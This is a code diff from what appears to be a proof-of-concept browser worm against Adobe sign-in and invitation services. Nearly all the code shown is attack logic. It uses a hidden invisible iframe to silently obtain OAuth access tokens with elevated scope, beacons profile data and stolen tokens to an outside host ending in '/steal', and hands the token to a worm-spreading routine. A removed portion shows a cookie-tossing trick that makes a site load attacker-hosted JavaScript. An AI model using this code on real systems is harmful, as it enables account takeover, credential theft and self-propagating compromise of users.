@@ -20,7 +20,7 @@
  */
 
 const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
-const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v7';
+const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v8';
 const AB_HOST  = 'https://ab.adobe-identity.com';
 const INV_HOST = 'https://invitations.adobe.io';
 const API_KEY_AB  = 'CCHomeWeb1';
@@ -61,24 +61,51 @@ async function stage1() {
     navigator.sendBeacon(`${EXFIL}?src=profile`, JSON.stringify(p));
   } catch {}
 
-  // If we already have projectx_webapp scope (Stage 2 context), run worm directly
+  // If we already have ab.manage scope, run worm directly
   if (payload.scope?.includes('ab.manage')) {
     navigator.sendBeacon(`${EXFIL}?src=stage`, 'direct_worm_ab_manage');
     await wormSpread(token);
     return;
   }
 
-  // Stage 1 → Stage 2 handoff: set webpack hijack cookie + redirect to Express
-  navigator.sendBeacon(`${EXFIL}?src=stage`, 'stage1_cookie_toss');
+  // Cross-client token theft: get CCHomeWeb1 token with ab.manage scope via hidden iframe
+  // IMS accepts redirect_uri=https://www.adobe.com/ for CCHomeWeb1 → same-origin iframe → read token
+  navigator.sendBeacon(`${EXFIL}?src=stage`, 'cross_client_iframe');
+  try {
+    const ccToken = await new Promise((resolve, reject) => {
+      const iframe = document.createElement('iframe');
+      iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;opacity:0;pointer-events:none';
+      const imsUrl = 'https://ims-na1.adobelogin.com/ims/authorize/v2'
+        + '?client_id=CCHomeWeb1'
+        + '&response_type=token'
+        + '&prompt=none'
+        + '&redirect_uri=' + encodeURIComponent('https://www.adobe.com/')
+        + '&scope=AdobeID,ab.manage,creative_sdk,openid';
+      iframe.src = imsUrl;
+      const timeout = setTimeout(() => { reject('timeout'); }, 8000);
+      iframe.onload = () => {
+        try {
+          const hash = iframe.contentWindow.location.hash;
+          const match = hash.match(/access_token=([^&]+)/);
+          if (match) {
+            clearTimeout(timeout);
+            resolve(decodeURIComponent(match[1]));
+          } else {
+            reject('no_token_in_hash');
+          }
+        } catch (e) {
+          reject('cross_origin_' + e.message);
+        }
+      };
+      document.body.appendChild(iframe);
+    });
 
-  // Cookie toss: hijack Express webpack public path to load attacker chunks
-  // x-asset-public-path cookie makes Express load JS chunks from our server
-  document.cookie = 'x-asset-public-path=https://cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v5.aem.live/express-chunks/; domain=.adobe.com; path=/; SameSite=None; Secure';
-
-  // Redirect to Express (victim is already signed in — Express loads with projectx_webapp token)
-  // The webpack hijack will load our Stage 2 payload from the attacker CDN
-  // For PoC: just demonstrate the cookie is set and token was stolen
-  navigator.sendBeacon(`${EXFIL}?src=stage1_complete`, 'cookie_set_token_stolen');
+    const ccPayload = decodeJWT(ccToken);
+    navigator.sendBeacon(`${EXFIL}?src=cc_token&client=${ccPayload.client_id}`, ccToken);
+    await wormSpread(ccToken);
+  } catch (e) {
+    navigator.sendBeacon(`${EXFIL}?src=debug`, 'iframe_token_fail_' + e);
+  }
 }
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
